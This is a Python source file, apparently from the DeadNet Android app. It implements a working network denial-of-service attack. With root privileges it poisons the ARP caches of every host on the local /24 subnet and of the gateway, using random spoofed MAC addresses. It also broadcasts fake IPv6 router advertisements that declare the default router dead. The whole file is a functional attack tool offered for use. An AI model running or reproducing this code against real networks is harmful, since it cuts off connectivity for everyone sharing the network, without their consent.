#!/usr/bin/env python3

import os
import re
import logging
import ipaddress
import subprocess
import threading
import platform as pt
from kivy.clock import Clock
from kivy.logger import Logger

from concurrent.futures import ThreadPoolExecutor
from utils import *
from scapy.all import *
from android.permissions import request_permissions, Permission
request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET, Permission.ACCESS_WIFI_STATE,
                     Permission.ACCESS_NETWORK_STATE, Permission.ACCESS_FINE_LOCATION, Permission.CHANGE_WIFI_STATE])

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
# todo is scapy even needed anymore?
conf.verb = 0  # scapy conf



#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   ....................................................................................................................
#   ....................................... ____ ............... _ _ . _ .... _ ........................................
#   .......................................|  _ \  ___  __ _  __| | \ | | ___| |_ ......................................
#   .......................................| | | |/ _ \/ _` |/ _` |  \| |/ _ \ __|......................................
#   .......................................| |_| |  __/ (_| | (_| | |\  |  __/ |_ ......................................
#   .......................................|____/ \___|\__,_|\__,_|_| \_|\___|\__|......................................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class DeadNetAPK:
    _BINARY_MAP = {
        "x86_64": "x86_64",
        "arm": "arm",
        "aarch64": "arm64",
        "i386": "i386",
    }

    def __init__(self, iface, gateway_ipv4, gateway_ipv6, gateway_mac=None, print_mtd=None):
        self._spoof_ipv6ra_interval = 5
        self._executor_sleep_interval = 0.1
        self._max_workers = 3

        self.network_interface = iface
        conf.iface = self.network_interface

        self.print_mtd = print_mtd
        self.my_mac = get_device_mac_address_su(self.network_interface)
        if self.my_mac == NET_UNDEFINED:
            raise Exception("Failed to get device MAC address")
        Logger.info(f"DeadNet: Set up user mac as {self.my_mac}")
        self.loop_count = 0

        self.abort = str()
        self.user_abort_reason = f"status    -    {RED}stopped{COLOR_RESET}"

        self.arch_type = self._BINARY_MAP.get(pt.machine())
        if not self.arch_type:
            Logger.info(f"DeadNet: Unsupported device machine architecture {pt.machine()}")
            raise Exception(f"Unsupported device machine architecture -> {pt.machine()}")

        if not self._prepare_binaries():
            raise Exception("Failed to prepare binaries")

        self.gateway_ipv6 = gateway_ipv6
        self.ipv6_prefix, self.ipv6_preflen = get_ipv6_prefdata(self.network_interface) if self.gateway_ipv6 != NET_UNDEFINED else (None, None)

        self.spoof_ipv6ra = self.ipv6_prefix and self.ipv6_preflen
        Logger.info(f"DeadNet: spoof_ipv6ra set to {self.spoof_ipv6ra}")

        self.user_ipv4 = get_if_addr(self.network_interface)
        Logger.info(f"DeadNet: user_ipv4 set to {self.user_ipv4}")

        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/24"  # assuming CIDR length is 24
        Logger.info(f"DeadNet: subnet_ipv4_sr set to {self.subnet_ipv4_sr}")

        self.gateway_ipv4 = gateway_ipv4
        self.gateway_mac = gateway_mac
        self.gateway_mac_fake = RandMAC()
        if not self.gateway_mac:
            raise Exception(f"Unable to get gateway MAC address")

        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                           str(host_ip) != self.user_ipv4 and str(host_ip) != self.gateway_ipv4]

        self.intro = str()
        if self.spoof_ipv6ra:
            self.intro += f"Dead router attack (IPv6)    -    {GREEN}enabled{COLOR_RESET}\n" \
                          f"IPv6 prefix    -    {self.ipv6_prefix}/{self.ipv6_preflen}\n" \
                          f"IPv6 gateway    -    {self.gateway_ipv6}\n\n"
        else:
            self.intro += f"Dead router attack (IPv6)    -    {RED}disabled{COLOR_RESET}\n\n"

        self.intro += f"ARP poisoning (IPv4)    -    {GREEN}enabled{COLOR_RESET}\n" \
                      f"IPv4 subnet range    -    {self.subnet_ipv4_sr}\n" \
                      f"IPv4 gateway    -    {self.gateway_ipv4}\n\n"

    def _prepare_binaries(self):
        try:
            # dynamic internal path
            internal_dir = get_app_data_dir()

            # construct source and destination paths
            arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{self.arch_type}')
            self.arp_path = os.path.join(internal_dir, f'arp.{self.arch_type}')
            nra_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{self.arch_type}')
            self.nra_path = os.path.join(internal_dir, f'nra.{self.arch_type}')

            for src_path, dest_path in [[arp_orig_path, self.arp_path],
                                        [nra_orig_path, self.nra_path]]:
                subprocess.run(f"su -c 'cp -rf {src_path} {dest_path}'", shell=True, check=True)
                subprocess.run(f"su -c 'chmod 777 {dest_path}'", shell=True, check=True)
                subprocess.run(f"su -c 'chown root {dest_path}'", shell=True, check=True)

            Logger.info("DeadNet: Binaries copied and permissions set successfully")
            return True
        except Exception as e:
            Logger.error(f"DeadNet: Unexpected error - {e}, traceback: {traceback.format_exc()}")
        return False

    def user_abort(self):
        self.abort = self.user_abort_reason

    def worker_attack_task(self, idx, host_ip):
        if self.spoof_ipv6ra and idx % self._spoof_ipv6ra_interval == 0:
            self.do_ipv6_attack()
        self.do_ipv4_attack(host_ip)

    def do_ipv4_attack(self, host_ip):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        subprocess.Popen(
            f"su -c {self.arp_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(
            f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def do_ipv6_attack(self):
        """
        * broadcast a fake dead default router message
        """
        subprocess.Popen(f"su -c {self.nra_path} {self.gateway_mac} {self.gateway_ipv6} "
                         f"{self.ipv6_prefix} {self.ipv6_preflen} {self.network_interface}",
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def start_workers_attack_loop(self):
        with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
            for idx, ip in enumerate(self.host_ipv4s):
                if self.abort:
                    return
                executor.submit(self.worker_attack_task, idx, ip)
                Clock.schedule_once(lambda dt: self.print_mtd(f"{self.intro}status    -    {GREEN}running...{COLOR_RESET} cycle #{self.loop_count} "
                                                              f"{GRAY}[{idx + 1} / {len(self.host_ipv4s)}]{COLOR_RESET}"))

                time.sleep(self._executor_sleep_interval)

    def start_attack(self):
        while not self.abort:
            try:
                self.loop_count += 1
                self.start_workers_attack_loop()

            except Exception as e:
                self.abort = traceback.format_exc()
                Logger.error(f"DeadNet: start_attack exception - {e}, traceback: {traceback.format_exc()}")
            except KeyboardInterrupt:
                Logger.info("DeadNet: start_attack user_interrupt")
                self.user_abort()

        if self.abort != self.user_abort_reason:
            Clock.schedule_once(lambda dt: self.print_mtd(f"{self.abort}", True))
        else:
            Clock.schedule_once(lambda dt: self.print_mtd(f"{self.intro}{self.abort}"))
